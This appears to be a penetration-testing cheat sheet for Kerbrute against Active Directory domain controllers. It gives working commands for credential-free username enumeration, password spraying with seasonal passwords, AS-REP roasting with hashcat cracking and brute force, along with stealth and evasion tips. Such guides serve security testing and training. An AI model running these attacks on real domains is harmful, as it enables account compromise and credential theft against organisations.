# Kerbrute – Complete Guide

## 🔍 Overview

- **Function**: Enumerate valid domain usernames **without credentials**  
- **Protocol**: Kerberos (UDP/TCP port 88)  
- **Target**: **Must be a Domain Controller (DC)** — <u>only DCs run the KDC service that validates usernames</u>

---
## ❓ FAQ (Self-Check)

### Q: Can Kerbrute enumerate users without any credentials?  
**A**: Yes. It analyzes Kerberos error codes:
- `KDC_ERR_CLIENT_REVOKED` or success → **valid user**  
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → **invalid user**

### Q: Does the target machine need to be online?  
**A**: Yes. This is an **online attack** requiring direct network access to the DC’s KDC service.

### Q: Why can't I run Kerbrute against a standard Windows 10 workstation IP?  
**A**: Workstations **do not store the domain user database** (`NTDS.dit`). Only **Domain Controllers** can validate domain-wide usernames.

### Q: What should I use if the target is a standalone machine (not in a domain)?  
**A**: Kerbrute **will not work**. Use:
- **SMB enumeration**: `nxc smb <IP> --users`  
- **RPC enumeration**: `rpcclient -U "" -N <IP>`

---
# 🛠️ Core Attack Modes

# 1. **User Enumeration** (Baseline)

- **Purpose**: Identify valid domain accounts  
- **Command**:
  ```bash
  kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt
  ```
- ✅ Silent, fast, no credentials needed

---
# 2. **Password Spraying**

- **Purpose**: Test **one password** against **many users** (avoids lockouts)  
- **Command**:
  ```bash
  kerbrute passwordspray --dc 10.10.10.10 -d domain.local valid_users.txt "Winter2026!"
  ```
- 💡 Uses less-monitored Kerberos traffic → better evasion than SMB/LDAP

---
# 3. **AS-REP Roasting** (Automatic during `userenum`)

- **What it finds**: Users with **"Do not require Kerberos pre-authentication"** enabled  
- **How it works**:  
  1. Sends AS-REQ for each user  
  2. If pre-auth disabled, DC returns encrypted AS-REP ticket  
  3. Kerbrute captures hash in `$krb5asrep$` format  
- **Crack offline**:
  ```bash
  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
  ```
- ✅ No password guessing required — pure offline cracking

---
# 4. **Brute-Force (Single User)**

- **Purpose**: Try many passwords against one user  
- **Command**:
  ```bash
  kerbrute bruteforce --dc 10.10.10.10 -d domain.local passwords.txt svc_backup
  ```
- ⚠️ **High risk**: Locks out accounts — only use on service accounts with known no-lockout policy

---
## 📋 Command Cheat Sheet

| Action | Command |
|--------|---------|
| **User enum** | `kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt` |
| **Password spray** | `kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt "Password123"` |
| **Brute-force** | `kerbrute bruteforce --dc <DC_IP> -d <DOMAIN> passwords.txt username` |

> ⚠️ **Critical**: Always target **Domain Controllers only** — never workstations

---
## 📊 Summary Table

| Feature | Command Flag | Use Case | Stealth |
|--------|--------------|----------|---------|
| **User Enum** | `userenum` | Find valid accounts | ★★★★★ |
| **Password Spray** | `passwordspray` | Test common passwords | ★★★★☆ |
| **AS-REP Roast** | Built into `userenum` | Get crackable hashes | ★★★★★ |
| **Brute-Force** | `bruteforce` | Target weak service accounts | ★☆☆☆☆ |

---
## 💡 Pro Tips

- Always run `userenum` first — it **automatically flags AS-REP roastable users**  
- Use **seasonal passwords** (`Winter2026!`, `Spring123@`) for spraying  
- Confirm **lockout policy** before brute-forcing  
- Kerbrute **only works against DCs** — targeting workstations fails silently

> 🔥 **Golden Rule**:  
> **Kerbrute = your Kerberos Swiss Army knife.**  
> Enumerate → Spray → Roast → Own.

